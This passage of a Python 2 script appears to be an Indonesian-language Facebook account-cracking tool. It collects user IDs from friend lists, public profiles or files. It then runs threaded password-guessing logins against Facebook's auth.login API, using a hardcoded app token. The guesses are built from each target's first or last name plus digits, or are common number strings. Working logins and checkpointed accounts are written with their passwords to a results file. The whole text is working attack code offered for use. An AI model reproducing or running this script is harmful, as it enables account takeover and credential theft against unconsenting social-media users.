    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/bangla.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/bangla.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/bangla.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/bangla.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/bangla.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/bangla.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '12345'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/bangla.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/bangla.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = '102030'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/bangla.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/bangla.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = '786786'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/bangla.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/bangla.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = '102030'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/bangla.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/bangla.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/bangla.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/bangla.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone bangla.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_usa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m)Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;94m _________  \x1b[1;97m  _____\x1b[1;94m___.    '
    print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;94m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/ \\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;91m \\     \\____ |  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;94m  \\______  / \x1b[1;97m|__|   \x1b[1;94m|___  /'
    print '\x1b[1;94m         \\/             \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mUsa\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_usa()


def pilih_usa():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_usa()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________  \x1b[1;97m  _____\x1b[1;94m___.    '
            print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;94m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/ \\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____ |  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;94m  \\______  / \x1b[1;97m|__|   \x1b[1;94m|___  /'
            print '\x1b[1;94m         \\/             \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '                \x1b[1;94m>>> \x1b[1;93mCRACK USA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________  \x1b[1;97m  _____\x1b[1;94m___.    '
            print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;94m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/ \\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____ |  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;94m  \\______  / \x1b[1;97m|__|   \x1b[1;94m|___  /'
            print '\x1b[1;94m         \\/             \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '                \x1b[1;94m>>> \x1b[1;93mCRACK USA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama Akun \x1b[1;91m:\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_usa()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;94m _________  \x1b[1;97m  _____\x1b[1;94m___.    '
            print '\x1b[1;94m \\_   ___ \\ \x1b[1;97m_/ ____\x1b[1;94m\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/ \\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____ |  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;94m  \\______  / \x1b[1;97m|__|   \x1b[1;94m|___  /'
            print '\x1b[1;94m         \\/             \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '                \x1b[1;94m>>> \x1b[1;93mCRACK USA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_usa()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_usa()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
